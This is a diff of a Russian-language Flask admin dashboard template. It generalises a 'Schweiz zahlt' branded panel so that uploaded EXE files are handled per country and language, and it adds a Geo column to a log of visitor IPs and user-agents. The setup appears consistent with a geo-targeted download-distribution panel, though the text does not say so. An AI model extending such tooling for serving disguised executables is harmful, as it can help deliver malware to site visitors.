@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dashboard – Schweiz zahlt Admin</title>
+  <title>Dashboard – Admin</title>
   <link rel="stylesheet" href="{{ url_for('static', filename='admin.css') }}">
 </head>
 <body class="admin-body">
   <header class="admin-header">
     <div class="admin-header__inner">
-      <h1>🇨🇭 Admin Dashboard</h1>
+      <h1>🌍 Admin Dashboard</h1>
       <div class="admin-header__actions">
         <a href="/" target="_blank" class="admin-link">Открыть сайт</a>
         <a href="{{ url_for('admin_logout') }}" class="admin-link admin-link--muted">Выйти</a>
@@ -42,10 +42,10 @@
     <section class="admin-section">
       <h2>Загрузка EXE-файлов</h2>
       <div class="admin-upload-grid">
-        {% for lang, info in file_info.items() %}
+        {% for key, info in file_info.items() %}
         <div class="admin-upload-card">
           <div class="admin-upload-card__header">
-            <strong>{{ lang.upper() }}</strong>
+            <strong>{{ info.label }} · {{ info.lang.upper() }}</strong>
             <span class="admin-badge">{{ info.filename }}</span>
           </div>
           <div class="admin-upload-card__meta">
@@ -56,7 +56,8 @@
             {% endif %}
           </div>
           <form method="post" action="{{ url_for('admin_upload') }}" enctype="multipart/form-data" class="admin-upload-form">
-            <input type="hidden" name="lang" value="{{ lang }}">
+            <input type="hidden" name="geo" value="{{ info.geo }}">
+            <input type="hidden" name="lang" value="{{ info.lang }}">
             <input type="file" name="exe" accept=".exe,application/octet-stream,application/x-msdownload" required>
             <button type="submit" class="admin-btn admin-btn--sm">Загрузить EXE</button>
           </form>
@@ -75,6 +76,7 @@
               <th>Время (UTC)</th>
               <th>IP</th>
               <th>Событие</th>
+              <th>Geo</th>
               <th>Язык</th>
               <th>Referrer</th>
               <th>User-Agent</th>
@@ -93,12 +95,13 @@
                   <span class="admin-tag">визит</span>
                 {% endif %}
               </td>
+              <td>{{ (v.geo or '—')|upper }}</td>
               <td>{{ (v.lang or '—')|upper }}</td>
               <td class="admin-truncate" title="{{ v.referrer or '' }}">{{ v.referrer or '—' }}</td>
               <td class="admin-truncate" title="{{ v.user_agent or '' }}">{{ v.user_agent or '—' }}</td>
             </tr>
             {% else %}
-            <tr><td colspan="7" class="admin-empty">Пока нет данных</td></tr>
+            <tr><td colspan="8" class="admin-empty">Пока нет данных</td></tr>
             {% endfor %}
           </tbody>
         </table>
